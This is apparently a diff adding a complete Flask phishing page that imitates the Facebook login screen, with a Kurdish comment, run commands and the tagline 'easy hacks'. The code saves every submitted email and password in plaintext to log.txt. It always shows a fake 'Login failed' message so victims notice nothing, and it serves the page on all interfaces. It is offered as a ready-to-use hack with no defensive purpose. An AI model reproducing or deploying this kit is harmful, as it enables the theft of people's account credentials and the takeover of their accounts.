@@ -1,0 +1,58 @@
+pip install flask
+
+
+
+from flask import Flask, render_template_string, request
+import datetime
+
+app = Flask(__name__)
+
+# HTMLی فۆرمی فەیسبووک (سادە)
+html = '''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook – log in or sign up</title>
+</head>
+<body style="background-color:#f0f2f5; font-family:sans-serif;">
+    <div style="margin-top:100px; text-align:center;">
+        <h2 style="color:#1877f2;">facebook</h2>
+        <form method="POST" style="display:inline-block; background:white; padding:20px; border-radius:10px;">
+            <input type="text" name="email" placeholder="Email or Phone" required style="width:300px; padding:10px; margin-bottom:10px;"><br>
+            <input type="password" name="password" placeholder="Password" required style="width:300px; padding:10px;"><br><br>
+            <button type="submit" style="background:#1877f2; color:white; padding:10px 100px; border:none; border-radius:5px;">Log In</button>
+        </form>
+        <p style="color:red; margin-top:10px;">Login failed. Please try again later.</p>
+    </div>
+</body>
+</html>
+'''
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        email = request.form['email']
+        password = request.form['password']
+        # Save to file
+        with open("log.txt", "a") as f:
+            f.write(f"[{datetime.datetime.now()}] Email: {email} | Password: {password}\n")
+    return render_template_string(html)
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
+
+nano facebook.py
+
+
+python facebook.py
+
+
+* Running on http://0.0.0.0:5000/
+
+
+http://localhost:5000
+
+
+cat log.txt
+easy hacks اسانە فێربە
